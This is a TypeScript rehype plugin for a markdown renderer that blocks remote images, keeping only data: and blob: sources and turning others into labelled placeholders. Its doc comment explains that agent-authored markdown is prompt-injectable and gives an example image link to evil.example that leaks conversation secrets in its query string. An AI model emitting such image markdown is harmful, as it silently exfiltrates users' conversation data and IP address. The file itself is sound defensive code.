import type { Element, ElementContent, Root } from 'hast'
import { visit } from 'unist-util-visit'
import {
  isLocalLinkHref,
  LOCAL_IMAGE_ALT_ATTRIBUTE,
  LOCAL_IMAGE_ATTRIBUTE,
  LOCAL_IMAGE_CLASS,
  LOCAL_IMAGE_FALLBACK_CLASS,
} from './localLinks'

/**
 * Marker classes on the placeholder that replaces a blocked image. Plain string
 * constants (not vanilla-extract `style()` hashes) because this module is pulled into
 * the markdown WORKER bundle (markdownWorker.ts), which must not import a `.css.ts` —
 * the styling side lives in markdownContent.css.ts and imports these names from here,
 * mirroring how `codeCopyHostClass` keys the DOM-injected copy button.
 */
export const BLOCKED_IMAGE_CLASS = 'blocked-remote-image'
export const BLOCKED_IMAGE_CHIP_CLASS = 'blocked-remote-image-chip'
export const BLOCKED_IMAGE_LABEL_CLASS = 'blocked-remote-image-label'

/** Text of the chip that explains why the image isn't shown. */
export const BLOCKED_IMAGE_CHIP_TEXT = 'remote image blocked'

/**
 * The ONLY image srcs that render as an actual `<img>`: inline, self-contained payloads
 * that cost no network request. `data:` carries its bytes in the URL; `blob:` resolves
 * against this origin's own blob registry (a foreign-origin blob URL simply fails to
 * resolve — it never hits the network). Everything else is a fetch.
 */
const INLINE_IMAGE_SRC_RE = /^(?:data|blob):/i

/**
 * Rehype plugin: replace every image that would cause a NETWORK FETCH with a visible,
 * explained placeholder. Only `data:` and `blob:` srcs survive as real `<img>` elements
 * (MCP tool results and the file viewer render screenshots through those two schemes).
 *
 * Why block rather than let it load: markdown here is largely agent-authored and thus
 * prompt-injectable, and an image URL is an *outbound request* the page makes on its
 * own. `![x](https://evil.example/p.png?leak=<secret>)` exfiltrates conversation content
 * in the query string and the user's IP address (plus headers) in the request itself, with
 * no click and no visible sign. The threat is identical on web and on desktop, so the
 * block lives HERE, in the shared pipeline, rather than in a shell-specific control:
 * the desktop CSP (`img-src 'self' data: blob:` in desktop/rust/tauri.conf.json) is now
 * defense-in-depth, not the enforcement point. It never covered the whole product anyway
 * — Tauri attaches it only to assets Tauri itself serves, so desktop-distributed (which
 * navigates the webview to the remote hub) and the browser build were never protected.
 * Accepted cost: remote markdown images no longer render anywhere, including web.
 *
 * The rule keeps three cases in order:
 *   - `data:` / `blob:` -> keep `<img>` untouched (inline payloads with no fetch).
 *   - safe local filesystem path / local `file:` URI (`isLocalLinkHref`) -> rewrite to a
 *     `local-markdown-image` placeholder span with no `<img>` or `src=`, so the main thread
 *     can fetch bytes over the worker E2EE RPC when an associated tab context is active.
 *   - everything else (`https://`, `http://`, protocol-relative `//host`, remote `file://host`,
 *     UNC `\\...`, empty src) -> blocked remote-image placeholder.
 *
 * The blocked placeholder keeps the author's alt text visible (it is the whole fallback) and
 * renders the src as an `<a href>` so the user can still open the image deliberately.
 * That anchor is left for the sibling `rehypeMarkdownLinks` pass to harden, which is why
 * this plugin must run BEFORE it: http(s) srcs become `target="_blank"` links, and every
 * other scheme (`javascript:`, remote `file:`, protocol-relative) is unwrapped to plain text by
 * that same single-sourced link rule instead of a second URL policy living here.
 */
export function rehypeBlockRemoteImages() {
  return (tree: Root) => {
    visit(tree, 'element', (node) => {
      if (node.tagName !== 'img')
        return
      const rawSrc = node.properties?.src
      const src = typeof rawSrc === 'string'
        ? rawSrc
        : ''
      if (src && INLINE_IMAGE_SRC_RE.test(src))
        return
      const rawAlt = node.properties?.alt
      const alt = typeof rawAlt === 'string'
        ? rawAlt
        : ''
      // Rewrite in place (tagName + properties + children) rather than splicing into the
      // parent: `<img>` is phrasing content inside a `<p>`, the `<span>` placeholder keeps
      // that valid, and an in-place swap needs no parent/index and can't be skipped for a
      // root-level image node.
      if (src && isLocalLinkHref(src)) {
        toLocalImagePlaceholder(node, src, alt)
        return
      }
      toPlaceholder(node, src, alt)
    })
  }
}

/**
 * Turn `node` into a context-independent local image placeholder span with no `<img>` or `src=`:
 * `<span class="local-markdown-image" data-local-image="..." data-local-image-alt="..."><span class="local-markdown-image-fallback"><label></span></span>`.
 */
function toLocalImagePlaceholder(node: Element, src: string, alt: string): void {
  const label = alt.trim() || src
  node.tagName = 'span'
  node.properties = {
    className: [LOCAL_IMAGE_CLASS],
    [LOCAL_IMAGE_ATTRIBUTE]: src,
    [LOCAL_IMAGE_ALT_ATTRIBUTE]: alt,
  }
  node.children = [
    {
      type: 'element',
      tagName: 'span',
      properties: {
        className: [LOCAL_IMAGE_FALLBACK_CLASS],
      },
      children: [
        { type: 'text', value: label },
      ],
    },
  ]
}

/** Turn `node` into `<span class="blocked-remote-image">[chip][alt-or-url link]</span>`. */
function toPlaceholder(node: Element, src: string, alt: string): void {
  const children: ElementContent[] = [
    {
      type: 'element',
      tagName: 'span',
      properties: {
        className: [BLOCKED_IMAGE_CHIP_CLASS],
      },
      children: [
        { type: 'text', value: BLOCKED_IMAGE_CHIP_TEXT },
      ],
    },
  ]
  // Prefer the author's own description; fall back to the URL so the placeholder is never
  // an unexplained chip on its own.
  const label = alt.trim() || src
  if (label) {
    children.push({
      type: 'element',
      tagName: 'a',
      properties: {
        className: [BLOCKED_IMAGE_LABEL_CLASS],
        href: src,
      },
      children: [
        { type: 'text', value: label },
      ],
    })
  }
  node.tagName = 'span'
  node.properties = {
    className: [BLOCKED_IMAGE_CLASS],
  }
  node.children = children
}
